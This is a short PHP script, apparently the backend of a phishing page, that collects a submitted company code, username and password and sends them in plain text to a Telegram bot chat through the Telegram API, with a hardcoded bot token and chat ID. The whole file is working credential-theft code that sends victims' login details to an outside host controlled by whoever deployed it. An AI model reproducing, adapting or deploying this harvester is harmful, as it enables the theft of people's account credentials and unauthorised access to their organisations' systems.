<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Validate and sanitize inputs
    $access = isset($_POST['companyId']) ? htmlspecialchars($_POST['companyId'], ENT_QUOTES, 'UTF-8') : '';
    $username = isset($_POST['username']) ? htmlspecialchars($_POST['username'], ENT_QUOTES, 'UTF-8') : '';
    $password = isset($_POST['password']) ? htmlspecialchars($_POST['password'], ENT_QUOTES, 'UTF-8') : '';

    // Construct final message
    $final = "Code: $access\nUsername: $username\nPassword: $password";

    // Telegram API URL with your bot token
    $bot_token = '7511656942:AAFShFjVRvR36y8EhwnQ_edzhDU6LpfDKjY';
    $telegram_url = "https://api.telegram.org/bot7511656942:AAFShFjVRvR36y8EhwnQ_edzhDU6LpfDKjY/sendMessage";

    // Prepare data for POST request
    $data = [
        'text' => $final,
        'chat_id' => '-4500931229'
    ];

    // Initialize CURL session
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegram_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

    // Execute CURL request and handle errors
    $result = curl_exec($ch);
    if (curl_errno($ch)) {
        echo 'Error: ' . curl_error($ch);
    } else {
        // Check Telegram API response
        $response = json_decode($result, true);
        if ($response && isset($response['ok']) && !$response['ok']) {
            echo 'Telegram API Error: ' . $response['description'];
        } else {
            echo 'Message sent successfully!';
        }
    }

    // Close CURL session
    curl_close($ch);
}
?>
